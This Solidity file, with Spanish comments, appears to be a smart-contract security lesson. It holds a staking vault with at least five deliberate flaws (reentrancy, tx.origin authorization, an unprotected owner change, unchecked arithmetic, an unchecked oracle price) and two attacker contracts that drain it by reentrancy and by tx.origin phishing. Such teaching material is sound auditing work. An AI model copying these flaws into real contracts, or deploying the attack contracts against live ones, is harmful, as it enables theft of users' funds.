// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

// Un oraculo de precio simplificado, solo para esta leccion.
interface IOraculoPrecio {
    function ultimoPrecio() external view returns (int256);
}

contract OraculoDePruebaAuditoria is IOraculoPrecio {
    int256 private _precio;

    constructor(int256 precioInicial) {
        _precio = precioInicial;
    }

    function fijarPrecio(int256 nuevoPrecio) external {
        _precio = nuevoPrecio;
    }

    function ultimoPrecio() external view returns (int256) {
        return _precio;
    }
}

// ============================================================================
// CONTRATO PARA AUDITAR.
// ============================================================================
//
// Es un "cofre de staking" de apariencia normal: la gente deposita ETH,
// puede retirarlo, y el owner tiene algunas funciones administrativas. Tiene
// AL MENOS 5 problemas de seguridad, cada uno relacionado con una leccion
// anterior de este modulo. Antes de leer la solucion en la leccion 17 de
// `docs/`, intenta encontrarlos vos mismo usando el checklist.
//
// Pista: lee cada funcion `external`/`public` y pregunta "quien deberia
// poder llamar esto, y que pasa si alguien mal intencionado lo hace en el
// peor momento posible?".
contract ContratoParaAuditar {
    address public owner;
    IOraculoPrecio public oraculo;

    mapping(address => uint256) public balances;
    mapping(address => uint256) public recompensas;

    event Depositado(address indexed quien, uint256 monto);
    event Retirado(address indexed quien, uint256 monto);

    constructor(address oraculo_) {
        owner = msg.sender;
        oraculo = IOraculoPrecio(oraculo_);
    }

    function cambiarOwner(address nuevoOwner) external {
        owner = nuevoOwner;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
        emit Depositado(msg.sender, msg.value);
    }

    function retirar() external {
        uint256 monto = balances[msg.sender];
        require(monto > 0, "Sin saldo");

        (bool ok, ) = msg.sender.call{value: monto}("");
        require(ok, "Envio fallido");

        balances[msg.sender] = 0;
        emit Retirado(msg.sender, monto);
    }

    function retiroDeEmergencia(address payable destino) external {
        require(tx.origin == owner, "No autorizado");

        (bool ok, ) = destino.call{value: address(this).balance}("");
        require(ok, "Envio fallido");
    }

    function otorgarRecompensa(address usuario, uint256 monto) external {
        require(msg.sender == owner, "No autorizado");

        unchecked {
            recompensas[usuario] += monto;
        }
    }

    function valorColateralEnUsd(uint256 cantidadEth) external view returns (uint256) {
        int256 precio = oraculo.ultimoPrecio();
        return (cantidadEth * uint256(precio)) / 1e18;
    }
}

// ---- Contratos de apoyo para el test: modelan los ataques ----

// Explota la reentrancy de retirar() (mismo patron que la leccion 01).
contract AtacanteAuditoria {
    ContratoParaAuditar public immutable objetivo;
    uint256 private _montoPorRetiro;

    constructor(ContratoParaAuditar objetivo_) {
        objetivo = objetivo_;
    }

    function atacar() external payable {
        _montoPorRetiro = msg.value;
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    receive() external payable {
        if (address(objetivo).balance >= _montoPorRetiro) {
            objetivo.retirar();
        }
    }
}

// Explota tx.origin en retiroDeEmergencia() (mismo patron que la leccion 02).
contract PhishingAuditoria {
    ContratoParaAuditar public immutable objetivo;
    address public immutable atacante;

    constructor(ContratoParaAuditar objetivo_, address atacante_) {
        objetivo = objetivo_;
        atacante = atacante_;
    }

    function reclamarRecompensa() external {
        objetivo.retiroDeEmergencia(payable(atacante));
    }
}
